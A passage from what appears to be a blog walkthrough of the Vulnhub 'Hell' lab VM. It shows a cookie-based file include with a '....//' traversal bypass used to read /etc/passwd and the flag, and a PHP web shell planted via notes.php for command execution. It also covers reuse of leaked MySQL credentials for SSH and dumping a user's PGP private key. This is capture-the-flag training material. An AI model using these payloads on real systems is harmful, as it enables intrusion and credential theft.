   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Personal Folder&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Notes&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;/CENTRE&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we have another script, &lt;code&gt;notes.php&lt;/code&gt; revealed. Browsing to &lt;code&gt;notes.php&lt;/code&gt;, we are presented with a input field with a &lt;em&gt;Write Note&lt;/em&gt; button, and a message stating: &lt;em&gt;&amp;ldquo;note.txt stored to temporary storage upon submission&amp;rdquo;&lt;/em&gt;. I guessed this temporary storage is most probably /tmp. Posting to notes.php did not yield any input and I figured this was part of something to come later.&lt;/p&gt;

&lt;h2 id=&#34;finding-the-web-vuln&#34;&gt;finding the web vuln&lt;/h2&gt;

&lt;p&gt;Ok we have come this far and you still reading? :O Just a little more and all will be revealed I promise.&lt;/p&gt;

&lt;p&gt;Back to &lt;code&gt;check.php&lt;/code&gt;, it was time to check for any potential SQL injection on the post to &lt;code&gt;check.php&lt;/code&gt; from the login form. Nope. Nothing like that. However, while messing around I noticed that this script was setting a new cookie &lt;code&gt;failcount&lt;/code&gt;. failcount would increment with every incorrect login to &lt;code&gt;check.php&lt;/code&gt;. After &lt;em&gt;3&lt;/em&gt; failed attempts, another cookie called &lt;code&gt;intruder&lt;/code&gt; was set:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Added cookie intruder=&amp;quot;1&amp;quot; for domain 192.168.56.102, path /super_secret_login_path_muhahaha/, expire 0
&amp;gt; Cookie: intruder=1; failcount=4; PHPSESSID=8u300rbb0747fi6iocm0lt4310
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again I will admit this did not jump right out at me. In fact it took quite a few more requests to finally puzzle it together. However, I finally nailed it when a request without the -L (follow redirects) flag was set for &lt;code&gt;panel.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;&amp;lt;HTML&amp;gt;
&amp;lt;CENTRE&amp;gt;
&amp;lt;H2&amp;gt; Folders &amp;lt;/H2&amp;gt;
&amp;lt;TABLE style=&amp;quot;width:700px&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;server.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;mail.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;users.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;personal.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;notes.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Server Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Mail Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Auth Users&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Personal Folder&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Notes&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;/CENTRE&amp;gt;
&amp;lt;HTML&amp;gt;
&amp;lt;CENTER&amp;gt;
&amp;lt;FONT COLOR = &amp;quot;RED&amp;quot;&amp;gt;
&amp;lt;H1&amp;gt;INTRUDER ALERT!&amp;lt;/H1&amp;gt;
&amp;lt;/FONT&amp;gt;
&amp;lt;/CENTER&amp;gt;
&amp;lt;/HTML&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Notice the familiar &lt;strong&gt;INTRUDER ALERT&lt;/strong&gt; message? :) Also remember how this file was called &lt;code&gt;/1&lt;/code&gt; from the previous enumeration? Yep! File Include time! With us having a cookiejar file called &lt;code&gt;cookies&lt;/code&gt; available for editing, it was easy to play around with this. The normal cookiejar had:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder 1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To test the file include, the first knee jerk reaction was to replace the &lt;code&gt;1&lt;/code&gt; with &lt;code&gt;/etc/passwd&lt;/code&gt;. This yielded no results, and immediately I feared failure and assumptions disappointing me. However, just to make sure, I replaced it again with something in the same path as &lt;code&gt;/1&lt;/code&gt;, like &lt;code&gt;mail.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ./mail.php

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&amp;lt;HTML&amp;gt;
&amp;lt;CENTRE&amp;gt;
&amp;lt;H2&amp;gt; Folders &amp;lt;/H2&amp;gt;
&amp;lt;TABLE style=&amp;quot;width:700px&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;server.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;mail.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;users.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;personal.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;notes.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Server Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Mail Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Auth Users&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Personal Folder&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Notes&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;/CENTRE&amp;gt;
&amp;lt;HTML&amp;gt;
&amp;lt;H3&amp;gt; Email&#39;s recieved in the last 24 hours: &amp;lt;/H3&amp;gt;2&amp;lt;BR&amp;gt;
&amp;lt;H3&amp;gt; Current Status: Firewall Activated &amp;lt;/H3&amp;gt;&amp;lt;BR&amp;gt;
&amp;lt;IMG SRC=&amp;quot;http://i.imgur.com/JjipeOj.gif&amp;quot;&amp;gt;
&amp;lt;/HTML&amp;gt;
&amp;lt;/HTML&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;YES. It &lt;strong&gt;does&lt;/strong&gt; work! We have the same output added to the &lt;code&gt;panel.php&lt;/code&gt; output as we would have if we browsed directly to &lt;code&gt;mail.php&lt;/code&gt;. By now the assumption was that the code had something like:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if ($_COOKIE[&#39;intruder&#39;]) {
   include($_COOKIE[&#39;intruder&#39;]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip;with some kind of filtering preventing reading the &lt;code&gt;/etc/passwd&lt;/code&gt;. While I was still pretty excited about finding this vuln, I soon came across &lt;a href=&#34;https://www.owasp.org/index.php/Testing_for_Path_Traversal_(OWASP-AZ-001)#Gray_Box_testing_and_example&#34;&gt;this&lt;/a&gt; article detailing potential ways of bypassing directory traversal vulnerabilities. After reading this I promptly changed the &lt;code&gt;intruder&lt;/code&gt; cookie to &lt;code&gt;....//....//....//....//....//etc/passwd&lt;/code&gt; and viola! :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//etc/passwd

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&amp;lt;HTML&amp;gt;
&amp;lt;CENTRE&amp;gt;
&amp;lt;H2&amp;gt; Folders &amp;lt;/H2&amp;gt;
&amp;lt;TABLE style=&amp;quot;width:700px&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;server.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;mail.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;users.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;personal.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;notes.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Server Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Mail Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Auth Users&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Personal Folder&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Notes&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;/CENTRE&amp;gt;
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
statd:x:102:65534::/var/lib/nfs:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:104:108:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
george:x:1000:1000:george,,,:/home/george:/bin/bash
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
jack:x:1001:1001::/home/jack:/bin/sh
milk_4_life:x:1002:1002::/home/milk_4_life:/bin/sh
developers:x:1003:1003::/home/developers:/bin/sh
bazza:x:1004:1004::/home/bazza:/bin/sh
oj:x:1005:1005::/home/oj:/bin/sh
&amp;lt;/HTML&amp;gt;
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;YEAH. That felt pretty darm good! Obviously not knowing all the steps needed to complete this VM, I figured I had come a pretty long way to finding the pot of gold. (Note the users in this file for later) During the enumeration I took a chance to include &lt;code&gt;/root/flag.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat cookies
# Netscape HTTP Cookie File
# http://curl.haxx.se/rfc/cookie_spec.html
# This file was generated by libcurl! Edit at your own risk.

192.168.56.102 FALSE /  FALSE 0  PHPSESSID   8u300rbb0747fi6iocm0lt4310
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  failcount   4
192.168.56.102 FALSE /super_secret_login_path_muhahaha/  FALSE 0  intruder ....//....//....//....//....//root/flag.txt

root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php -c cookies -b cookies

&amp;lt;HTML&amp;gt;
&amp;lt;CENTRE&amp;gt;
&amp;lt;H2&amp;gt; Folders &amp;lt;/H2&amp;gt;
&amp;lt;TABLE style=&amp;quot;width:700px&amp;quot; align=&amp;quot;center&amp;quot;&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;server.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;mail.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;users.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;personal.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;A HREF=&amp;quot;notes.php&amp;quot;&amp;gt;&amp;lt;IMG SRC=&#39;folder.png&#39;&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;TR&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Server Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Mail Status&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Auth Users&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Personal Folder&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
   &amp;lt;TD&amp;gt;&amp;lt;H4&amp;gt;Notes&amp;lt;/H4&amp;gt;&amp;lt;/TD&amp;gt;
&amp;lt;/TR&amp;gt;
&amp;lt;/CENTRE&amp;gt;
Congratulations of beating Hell.

I hope you enjoyed it and there weren&#39;t to many trolls in here for you.

Hit me up on irc.freenode.net in #vulnhub with your thoughts (Peleus) or follow me on twitter @0x42424242

Flag: a95fc0742092c50579afae5965a9787c54f1c641663def1697f394350d03e5a53420635c54fffc47476980343ab99951018fa6f71f030b9986c8ecbfc3a3d5de


&amp;lt;/HTML&amp;gt;
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And bingo. &lt;em&gt;Technically&lt;/em&gt; we finished what the original goal was, though, re-reading the original entry on Vulnhub, I was almost certain this was not the only way to get to this. Maybe a bug on the original release of the VM? I don&amp;rsquo;t know.
From here on onwards, the goal was no longer to read &lt;code&gt;/root/flag.txt&lt;/code&gt;. No, we now have to root this VM :)&lt;/p&gt;

&lt;h2 id=&#34;gaining-shell&#34;&gt;gaining shell&lt;/h2&gt;

&lt;p&gt;With the focus slightly shifting, and our ability to read files off the file system, the next natural step was to attempt to get command execution on the VM. Remembering the &lt;code&gt;notes.php&lt;/code&gt; file, I decided to try include &lt;code&gt;/tmp/note.txt&lt;/code&gt;. This worked just fine and echoed my testing attempts from earlier. So with this information, I simply went back to &lt;code&gt;notes.php&lt;/code&gt;, entered: &lt;code&gt;&amp;lt;?php print_r(shell_exec($_GET[&#39;c&#39;])); ?&amp;gt;&lt;/code&gt;, and submitted the form. Next I edited the cookiejar to include &lt;code&gt;/tmp/notes.txt&lt;/code&gt;, and proceeded to test my command execution:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=id -c cookies -b cookies
[snip]
&amp;lt;/CENTRE&amp;gt;
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&amp;lt;/HTML&amp;gt;
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay :) With this confirmed working, I modified the command exec request slightly so that commands with potentially strange characters are correctly encoded etc:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;curl http://192.168.56.102/super_secret_login_path_muhahaha/panel.php?c=$(echo -n “ls -lah” | python -c &amp;quot;import urllib, sys; print urllib.quote(&#39;&#39;.join(sys.stdin));&amp;quot;) -c cookies -b cookies
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;becoming-jack&#34;&gt;becoming jack&lt;/h2&gt;

&lt;p&gt;With command execution, it was easy to start enumerating as much as possible about the VM. At least as much as the &lt;code&gt;www-data&lt;/code&gt; user has access to, which is generally quite a lot.&lt;/p&gt;

&lt;p&gt;I looked at the source files for the website out of curiosity about the filtering etc that was going on. I stumbled upon some MySQL credentials in &lt;code&gt;login.php&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// mysql_connect(&amp;quot;127.0.0.1&amp;quot;, &amp;quot;Jack&amp;quot;, &amp;quot;zgcR6mU6pX&amp;quot;) or die (&amp;quot;Server Error&amp;quot;); I&#39;ll change this back once development is done. Got sick of typing my password.
mysql_connect(&amp;quot;127.0.0.1&amp;quot;, &amp;quot;www-data&amp;quot;, &amp;quot;website&amp;quot;) or die(&amp;quot;Server Error&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The comment was quite helpful along with all the mentions of Jack on the website, along with the &lt;code&gt;/etc/passwd&lt;/code&gt; revealing a &lt;code&gt;jack&lt;/code&gt; user, I tried these credentials on a SSH session:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh jack@192.168.56.102
jack@192.168.56.102&#39;s password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sun Jul 20 04:29:06 2014 from 192.168.56.1
$ id
uid=1001(jack) gid=1001(jack) groups=1001(jack)
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Well that was easy&amp;hellip; With this shell, I also checked out the MySQL database to see if there is any interesting information:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ mysql -uwww-data -pwebsite
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10320
Server version: 5.5.37-0+wheezy1 (Debian)

Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.

mysql&amp;gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| website            |
+--------------------+
2 rows in set (0.00 sec)

mysql&amp;gt; use website;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql&amp;gt; show tables;
+-------------------+
| Tables_in_website |
+-------------------+
| users             |
+-------------------+
1 row in set (0.00 sec)

mysql&amp;gt; select * from users;
+----------+-----------+
| username | password  |
+----------+-----------+
| Jack     | g0tmi1k69 |
+----------+-----------+
1 row in set (0.00 sec)

mysql&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Alrighty. I made a note about the credentials we have associated with &amp;lsquo;Jack&amp;rsquo; so far. I also tested these credentials on the website, just to get a feel of what the site was actually supposed to do :P&lt;/p&gt;

&lt;h2 id=&#34;becoming-milk-4-life&#34;&gt;becoming milk_4_life&lt;/h2&gt;

&lt;p&gt;Jack had a &lt;code&gt;.pgp&lt;/code&gt; folder with a private key stored in hes home directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ pwd
/home/jack/.pgp

$ ls -lah
total 20K
drwx------ 2 jack jack 4.0K Jun 18 12:35 .
drwx------ 4 jack jack 4.0K Jun 22 18:28 ..
-rwx------ 1 jack jack   39 Jun 18 12:35 note
-rwx------ 1 jack jack 1.8K Jun 18 12:20 pgp.priv
-rwx------ 1 jack jack  890 Jun 18 12:24 pgp.pub

$ cat pgp.priv
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: BCPG C# v1.6.1.0

lQOsBFOg9v8BCACbr++BXlL9e4N6pzcrHkNZGANB7Ii3vHc0Nj37kCm7ZuTMx4LN
bpWrqGb9W9grS9YQ7xSEkBShaKlWMilb4rqrM/tmDyuGt9UozCrVrCTfaZdPl72o
u1QO1DxTT9/iFwlb6AAjTvJGQQx92PQeShEOeTtycH+Xz4tx1ezHpbA4HK9ijftR
lyZy+y9GPSqYLsIU3N8WtnrTJRfSMiU/AGv/GWpykp3tlHjIL0YSHfvUppe4xAil
54J+LN7se3jKuFcRM+i9TF08hsTtM6azl7X4yyEDhHcvWgFY/vyggEwe6/ZP1IKG
zzAWi0sx7tlZLxyr9AFSXLwLvbhUpR3M5rJBABEBAAH/AwMC8ht700SVD+1guMSO
NKMnwLvKkrmW32b/zo/x4g4MbhUs1BXIvHfGw1ArsEpkMucb8utDqGzcwctR00de
jTr/nFo0gKxBMgc34e9HNTI0iFlVYWDFZqU4ie6/Pyt8qvZHOe5Aq0qPsCkcdMME
bR6EQng1ZBXX7zHCF2TobPnIxp5CGI2WUwXmXaGQS/hRriIcAhDx5ZFFqOdVQWES
mLo5Rd205/M4mungbUvwrHayu6ZGume+VXs630YaacNiBFpXnPDfKOCipZ+EhYsz
7febMxXj3mANwLXQfyTZOIXPzMptE11fbDA8jpy9m0vMy5ZCpJnp/VoTaaUxMz45
OeUI9nKTx9P1lGPC9hYidshg3Sg5Iz/qqmL/byAv1bUV2YOdJlAS1XY9Jj/wNrYz
yG9ASw5nfp0ChhLYnnU4dgfEk5bajGvgnhZAlb/+yNvJ5eUcwivjFC8jJUwlrZ+Z
oj1XAC4148JsjcQHW1d7yONc4iI7tSubMNa5GfBal1BxMRLP3nSZ4ICl67gTjrKH
ztiMKAefip3ywnRomfn7q9raJQ8TsKp0+REVy05mhZMZ1AdMlZzhTz8cYy8II6yr
qSxuJARfJ95FGYPrASMfJ+aZfPNk5RDnH5d92vxm/nIWexdayZqqQJG4MzOhtrjx
a0YouqQhxvD2aKslEBJ1S/D4D40xkVI+oaI+aM/6X+XzC2XVJgm7G8FvmtE09BUm
fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
tqg=
=SCkw
-----END PGP PRIVATE KEY BLOCK-----
$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There was also a note in the directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ cat note
The usual password as with everything.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that &lt;code&gt;/var/mail&lt;/code&gt; was world readable:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;$ pwd
/var/mail/jack/received
$ ls -lah
total 12K
drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 .
drwxr-sr-x 3 jack jack 4.0K Jul  5 19:56 ..
-rw-r--r-- 1 root mail  709 Jun 18 12:26 message.eml
$ cat message.eml
-----BEGIN PGP MESSAGE-----
Version: BCPG C# v1.6.1.0

hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
